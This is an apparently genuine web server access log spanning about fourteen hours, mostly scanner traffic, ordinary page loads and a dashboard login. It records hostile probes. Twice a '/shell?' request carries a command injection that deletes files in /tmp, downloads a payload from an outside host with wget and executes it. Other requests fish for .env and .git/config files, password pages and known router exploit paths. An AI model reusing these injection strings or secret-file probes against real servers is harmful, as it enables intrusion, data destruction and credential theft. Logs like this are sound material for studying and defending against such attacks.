83.135.177.178 - - [17/Jul/2025:21:28:52 +0000] "POST /login?next=%2Fdashboards HTTP/1.1" 500 452 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
3.143.33.63 - - [17/Jul/2025:21:35:03 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
204.76.203.219 - - [17/Jul/2025:21:35:08 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
3.143.33.63 - - [17/Jul/2025:21:35:20 +0000] "\x16\x03\x01" 400 494 "-" "-"
3.143.33.63 - - [17/Jul/2025:21:35:24 +0000] "SSH-2.0-Go" 400 494 "-" "-"
3.143.33.63 - - [17/Jul/2025:21:35:25 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
93.123.72.134 - - [17/Jul/2025:21:58:01 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
89.248.168.30 - - [17/Jul/2025:22:05:55 +0000] "GET /articles/ HTTP/1.1" 404 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
89.248.168.30 - - [17/Jul/2025:22:05:58 +0000] "GET /articles/ HTTP/1.1" 404 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
149.50.96.5 - - [17/Jul/2025:22:15:08 +0000] "GET /page/style/index.css HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
20.65.195.28 - - [17/Jul/2025:22:16:21 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
147.185.132.49 - - [17/Jul/2025:22:28:56 +0000] "GET / HTTP/1.0" 200 10945 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
149.50.96.114 - - [17/Jul/2025:22:31:02 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
149.50.96.5 - - [17/Jul/2025:22:42:24 +0000] "GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
8.219.176.71 - - [17/Jul/2025:23:03:51 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
77.83.240.4 - - [17/Jul/2025:23:23:19 +0000] "GET / HTTP/1.0" 200 10945 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
170.106.181.163 - - [17/Jul/2025:23:43:52 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
95.214.52.169 - - [17/Jul/2025:23:49:58 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
149.50.96.5 - - [18/Jul/2025:00:03:58 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
204.76.203.219 - - [18/Jul/2025:00:18:20 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.96.5 - - [18/Jul/2025:00:32:32 +0000] "GET /login.asp HTTP/1.1" 404 382 "-" "-"
162.142.125.115 - - [18/Jul/2025:00:47:10 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.115 - - [18/Jul/2025:00:47:16 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.115 - - [18/Jul/2025:00:47:16 +0000] "PRI * HTTP/2.0" 400 494 "-" "-"
162.142.125.115 - - [18/Jul/2025:00:47:20 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.115 - - [18/Jul/2025:00:47:20 +0000] "PRI * HTTP/2.0" 400 494 "-" "-"
162.142.125.115 - - [18/Jul/2025:00:47:31 +0000] "\x16\x03\x01" 400 494 "-" "-"
162.142.125.115 - - [18/Jul/2025:00:47:34 +0000] "GET /wiki HTTP/1.1" 404 363 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
149.50.96.114 - - [18/Jul/2025:00:55:47 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
38.111.114.216 - - [18/Jul/2025:00:56:32 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/138.0.0.0 Safari/537.36"
38.111.114.216 - - [18/Jul/2025:00:56:32 +0000] "\x16\x03\x01\x02" 400 494 "-" "-"
149.50.96.5 - - [18/Jul/2025:00:59:34 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
198.235.24.39 - - [18/Jul/2025:01:02:55 +0000] "\x16\x03\x01" 400 494 "-" "-"
198.235.24.39 - - [18/Jul/2025:01:02:55 +0000] "\x16\x03\x01" 400 494 "-" "-"
89.42.231.140 - - [18/Jul/2025:01:15:55 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 363 "-" "-"
185.218.84.46 - - [18/Jul/2025:01:42:37 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0"
172.104.11.4 - - [18/Jul/2025:02:32:11 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
50.116.26.161 - - [18/Jul/2025:02:33:15 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 zgrab/0.x"
149.50.96.5 - - [18/Jul/2025:02:34:23 +0000] "POST /bapply.cgi HTTP/1.1" 404 382 "http://213.165.87.118:80/apply.cgi" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
45.79.181.223 - - [18/Jul/2025:02:39:45 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
93.174.93.12 - - [18/Jul/2025:02:42:35 +0000] "GET / HTTP/1.0" 200 10945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10"
43.157.38.131 - - [18/Jul/2025:02:44:19 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.96.5 - - [18/Jul/2025:03:03:33 +0000] "GET /cgi-bin/index.html HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
8.222.164.241 - - [18/Jul/2025:03:12:14 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
204.76.203.219 - - [18/Jul/2025:03:18:08 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.52.169 - - [18/Jul/2025:03:45:31 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
87.121.84.34 - - [18/Jul/2025:04:05:11 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
92.60.40.217 - - [18/Jul/2025:04:05:43 +0000] "GET /.env HTTP/1.1" 404 363 "-" "Python/3.11 aiohttp/3.12.14"
104.152.52.135 - - [18/Jul/2025:04:10:16 +0000] "\x16\x03\x01" 400 494 "-" "-"
104.152.52.133 - - [18/Jul/2025:04:10:17 +0000] "GET / HTTP/1.1" 200 8703 "-" "curl/7.61.1"
104.152.52.133 - - [18/Jul/2025:04:10:17 +0000] "GET /data:image/svg+xml,<svg xmlns=" 400 494 "-" "-"
45.135.194.10 - - [18/Jul/2025:04:10:36 +0000] "CONNECT ipscore.vexhub.dev:443 HTTP/1.1" 405 509 "-" "Go-http-client/1.1"
91.148.246.98 - - [18/Jul/2025:04:21:15 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1"
137.184.187.170 - - [18/Jul/2025:04:25:01 +0000] "GET / HTTP/1.1" 200 8703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
137.184.187.170 - - [18/Jul/2025:04:25:01 +0000] "GET /data:image/svg+xml,%3Csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20width=%2732%27%20height=%2732%27%20viewBox=%270%200%2032%2032 HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
137.184.187.170 - - [18/Jul/2025:04:25:01 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
87.121.84.130 - - [18/Jul/2025:04:30:38 +0000] "PUT /SDK/webLanguage HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
149.50.96.5 - - [18/Jul/2025:04:33:23 +0000] "GET /page/style/index.css HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
79.124.58.198 - - [18/Jul/2025:04:37:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.221.58.108 - - [18/Jul/2025:04:39:11 +0000] "GET /actuator/health HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
149.50.96.114 - - [18/Jul/2025:04:50:59 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
149.50.96.5 - - [18/Jul/2025:05:24:28 +0000] "GET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
184.105.139.68 - - [18/Jul/2025:05:29:18 +0000] "\x16\x03\x01" 400 494 "-" "-"
45.135.193.162 - - [18/Jul/2025:05:35:20 +0000] "GET / HTTP/1.1" 200 8684 "-" "-"
20.55.3.202 - - [18/Jul/2025:05:35:24 +0000] "GET /portal/redlion HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
194.165.16.166 - - [18/Jul/2025:05:45:01 +0000] "\x03" 400 494 "-" "-"
185.156.73.154 - - [18/Jul/2025:05:53:22 +0000] "\x03" 400 494 "-" "-"
149.50.96.114 - - [18/Jul/2025:06:01:55 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
79.124.58.198 - - [18/Jul/2025:06:20:13 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
43.153.96.79 - - [18/Jul/2025:06:20:47 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
204.76.203.219 - - [18/Jul/2025:06:28:35 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.114.137.114 - - [18/Jul/2025:06:46:58 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.180.140.107 - - [18/Jul/2025:06:51:16 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.52.169 - - [18/Jul/2025:07:21:11 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
185.156.73.154 - - [18/Jul/2025:07:28:23 +0000] "\x03" 400 494 "-" "-"
149.50.96.114 - - [18/Jul/2025:07:29:45 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
79.124.58.198 - - [18/Jul/2025:07:35:51 +0000] "\x16\x03\x01\x05\xa8\x01" 400 494 "-" "-"
151.234.200.94 - - [18/Jul/2025:08:11:36 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
80.82.77.202 - - [18/Jul/2025:08:18:32 +0000] "GET / HTTP/1.0" 200 10945 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
151.236.216.95 - - [18/Jul/2025:08:39:43 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
151.236.216.95 - - [18/Jul/2025:08:39:53 +0000] "\x16\x03\x01" 400 494 "-" "-"
151.236.216.95 - - [18/Jul/2025:08:39:53 +0000] "\x16\x03\x01" 400 494 "-" "-"
151.236.216.95 - - [18/Jul/2025:08:39:54 +0000] "\x16\x03\x01" 400 494 "-" "-"
192.241.160.21 - - [18/Jul/2025:08:49:30 +0000] "\x16\x03\x01" 400 494 "-" "-"
192.241.160.21 - - [18/Jul/2025:08:49:30 +0000] "\x16\x03\x01" 400 494 "-" "-"
192.241.160.21 - - [18/Jul/2025:08:49:30 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /form.html HTTP/1.1" 404 363 "-" "curl/8.1.2"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /upl.php HTTP/1.1" 404 363 "-" "Mozilla/5.0"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /t4 HTTP/1.1" 404 363 "-" "Mozilla/5.0"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /geoip/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.160.21 - - [18/Jul/2025:08:49:31 +0000] "GET /1.php HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.160.21 - - [18/Jul/2025:08:49:32 +0000] "GET /systembc/password.php HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.160.21 - - [18/Jul/2025:08:49:32 +0000] "GET /password.php HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.106.163.48 - - [18/Jul/2025:08:53:02 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.96.114 - - [18/Jul/2025:08:54:32 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
65.49.1.162 - - [18/Jul/2025:09:09:46 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
149.50.96.5 - - [18/Jul/2025:09:10:00 +0000] "GET /login.asp HTTP/1.1" 404 382 "-" "-"
65.49.1.164 - - [18/Jul/2025:09:13:01 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
65.49.1.162 - - [18/Jul/2025:09:13:36 +0000] "GET /geoserver/web/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
204.76.203.219 - - [18/Jul/2025:09:16:15 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.227.62.178 - - [18/Jul/2025:09:21:00 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
89.244.85.62 - - [18/Jul/2025:09:47:10 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:09:47:11 +0000] "GET /favicon.ico HTTP/1.1" 500 804 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:09:48:32 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:09:51:42 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
77.83.240.4 - - [18/Jul/2025:09:55:02 +0000] "GET / HTTP/1.0" 200 10945 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
80.82.77.202 - - [18/Jul/2025:09:56:58 +0000] "\x16\x03\x02\x01o\x01" 400 494 "-" "-"
89.244.85.62 - - [18/Jul/2025:10:01:58 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
170.64.194.74 - - [18/Jul/2025:10:07:10 +0000] "GET /.env HTTP/1.1" 500 804 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
170.64.194.74 - - [18/Jul/2025:10:07:11 +0000] "GET /.git/config HTTP/1.1" 500 804 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
89.244.85.62 - - [18/Jul/2025:10:15:58 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:16:43 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:19:43 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:26:31 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:27:36 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:29:27 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:31:53 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:31:54 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:31:57 +0000] "GET /dashboards HTTP/1.1" 302 664 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:31:57 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:32:03 +0000] "POST /login?next=%2Fdashboards HTTP/1.1" 302 704 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:32:03 +0000] "GET /dashboards HTTP/1.1" 500 466 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:33:39 +0000] "GET /dashboards HTTP/1.1" 200 4762 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:33:43 +0000] "POST /logout HTTP/1.1" 302 528 "http://213.165.87.118/dashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:33:43 +0000] "GET /login HTTP/1.1" 200 1630 "http://213.165.87.118/dashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:33:52 +0000] "POST /login HTTP/1.1" 302 704 "http://213.165.87.118/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
89.244.85.62 - - [18/Jul/2025:10:33:53 +0000] "GET /dashboards HTTP/1.1" 200 4761 "http://213.165.87.118/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
147.185.132.125 - - [18/Jul/2025:10:43:35 +0000] "GET / HTTP/1.1" 200 2779 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
130.83.73.245 - - [18/Jul/2025:10:47:30 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:10:47:30 +0000] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3607 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:10:47:30 +0000] "GET /favicon.ico HTTP/1.1" 404 497 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:10:51:07 +0000] "GET / HTTP/1.1" 504 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:10:58:59 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:10:58:59 +0000] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3608 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
188.102.178.33 - - [18/Jul/2025:10:59:04 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:10:59:05 +0000] "GET /favicon.ico HTTP/1.1" 404 497 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:10:59:56 +0000] "-" 408 0 "-" "-"
130.83.73.245 - - [18/Jul/2025:11:00:08 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:00:10 +0000] "GET / HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:00:13 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:00:51 +0000] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:00:53 +0000] "GET / HTTP/1.1" 200 3459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:01:12 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:01:15 +0000] "GET / HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:03:52 +0000] "GET / HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:03:55 +0000] "GET / HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
